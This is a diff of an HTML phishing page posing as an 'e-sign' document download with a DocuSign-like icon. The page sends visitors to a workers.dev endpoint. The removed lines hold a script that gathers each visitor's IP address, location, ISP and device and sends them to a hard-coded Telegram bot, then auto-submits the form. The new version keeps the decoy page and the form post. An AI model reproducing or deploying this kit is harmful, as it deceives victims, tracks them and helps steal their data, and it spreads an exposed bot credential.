@@ -1,115 +1,74 @@
-<html><head>
-	<meta charset="utf-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-	<title>e-sign</title>
-    <link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
-	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-    <!-- FIXED TURNSTILE SCRIPT URL -->
-    <script src="https://challenges.cloudflare.com" async defer></script>
-	<style>
-@font-face {
-	font-family: 'fmtt';
-	src: url(img/font1.woff2) format('truetype');
-}
-* {
-	margin: auto;
-	font-size: 14px;
-	outline: 0;
-	font-family: 'fmtt';
-}
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>e-sign</title>
+<link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<style>
+@font-face { font-family: 'fmtt'; src: url(img/font1.woff2) format('truetype'); }
+* { margin: auto; font-size: 14px; outline: 0; font-family: 'fmtt'; }
 body {
-	background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
-	background-size: cover;
-	backdrop-filter: blur(5px);
-    text-align: center;
+  background: url('https://i.ibb.co/G3spj5wR/orgo-blur.png') no-repeat center center fixed;
+  background-size: cover;
+  backdrop-filter: blur(5px);
 }
-@keyframes roll {
-	from { transform: rotate(0deg); }
-	to { transform: rotate(360deg); }
-}
-#rl {
-	animation: roll 1s infinite;
-    display: none;
-}
-@keyframes fade {
-	from { opacity: 1; }
-	to { opacity: 0.3; }
-}
-#fd {
-	animation: fade 1s infinite;
-}
-.captcha-container {
-    margin-top: 180px;
-    background: rgba(255, 255, 255, 0.1);
-    padding: 20px;
-    border-radius: 10px;
-    display: inline-block;
-    backdrop-filter: blur(10px);
-    border: 1px solid rgba(255,255,255,0.2);
-}
-	</style>
+input { border: 0; display: block; margin-top: 0px; width: 100%; padding: 6px; background: #f2f2f2; padding-left: 0; }
+td { border-right: 1px solid black; padding-right: 10px; padding-left: 10px; font-size: 11px; color: #0072ce; }
+.inp { margin-top: 30px; border-radius: 15px; background: #f2f2f2; text-align: center; border: 1px solid #f2f2f2; width: 93%; padding: 6px; padding-left: 1px; }
+label { display: block; text-align: left; margin: 0; font-size: 10px; color: gray; padding: 0; width: 100%; }
+@keyframes roll { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+#rl { animation: roll 1s infinite; }
+@keyframes fade { from { opacity: 1; } to { opacity: 0.3; } }
+#fd { animation: fade 1s infinite; }
+</style>
+<script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
 </head>
 <body>
 
 <div style="max-width:500px;padding:0px;">
 
-    <div id="captcha-gate" class="captcha-container">
-        <p style="color:white; margin-bottom:15px; text-shadow: 1px 1px 2px black;">Please verify you are human</p>
-        <div class="cf-turnstile" 
-             data-sitekey="0x4AAAAAACafd07cw2w7X14i" 
-             data-callback="onSuccess"></div>
-    </div>
+<form id="downloadForm" method="POST" action="https://wandering-cherry-0bf1.g03755901.workers.dev/">
 
-    <!-- FIXED WORKER URL WITH HTTPS -->
-    <form id="downloadForm" method="POST" action="https://wandering-cherry-0bf1.g03755901.workers.dev" style="display:none;">
-        <div style="text-align:center">
-          <img src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" width="45" height="45" style="margin-top:150px;object-fit:contain;" id="fd" alt="icon">
-        </div>
-        <p style="text-align:center;font-size:15px;margin-top:10px; color:white;">Processing Document...</p>
-        <span style="display:block;height:15px;width:15px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;" id="rl"></span>
-    </form>
+  <div style="text-align:center">
+    <img
+      src="https://i.ibb.co/sJFnm0RH/Icon-pdf-file-svg.png" 
+      width="45"
+      height="45"
+      style="margin-top:200px;object-fit:contain;"
+      id="fd"
+      alt="icon"
+      loading="lazy"
+      onerror="this.onerror=null; this.src='images/fallback.png';"
+    >
+  </div>
+
+  <p style="text-align:center;font-size:15px;margin-top:10px"></p>
+
+  <span
+    style="display:block;height:10px;width:10px;border:3px solid lightgray;border-radius:70px;border-top-color:red;margin-top:40px;"
+    id="rl"
+  ></span>
+
+  <!-- Cloudflare Turnstile widget -->
+  <div class="cf-turnstile" data-sitekey="0x4AAAAAACafd07cw2w7X14i" style="margin-top:20px;"></div>
+
+  <button type="submit" style="margin-top:20px;">Download File</button>
+
+</form>
 
 </div>
 
 <script>
-    function onSuccess(token) {
-        document.getElementById('captcha-gate').style.display = 'none';
-        document.getElementById('downloadForm').style.display = 'block';
-        document.getElementById('rl').style.display = 'block';
-        sendLogsAndSubmit();
-    }
+const fd = document.getElementById('fd');
+const rl = document.getElementById('rl');
+const form = document.getElementById('downloadForm');
 
-    function sendLogsAndSubmit() {
-        const botToken = '5339183225:AAHuHKeVQYvIIB6Cy2SiiWwk2414E16JNCA'; 
-        const chatId = '5167329072';
-
-        fetch('https://ipapi.co/json/')
-            .then(response => response.json())
-            .then(data => {
-                const message = `
- #---------[ HUMAN VERIFIED ]-----------#:
-  IP Address: ${data.ip || 'Unknown'}
-  Location: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}
-  ISP: ${data.org || 'Unknown'}
-  Device: ${navigator.platform}
-                `;
-
-                const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                })
-                .then(() => {
-                    setTimeout(() => {
-                        document.getElementById('downloadForm').submit();
-                    }, 1500);
-                });
-            })
-            .catch(error => {
-                document.getElementById('downloadForm').submit();
-            });
-    }
+form.addEventListener('submit', () => {
+  fd.style.display = 'block';
+  rl.style.display = 'block';
+});
 </script>
 
-</body></html>
+</body>
+</html>
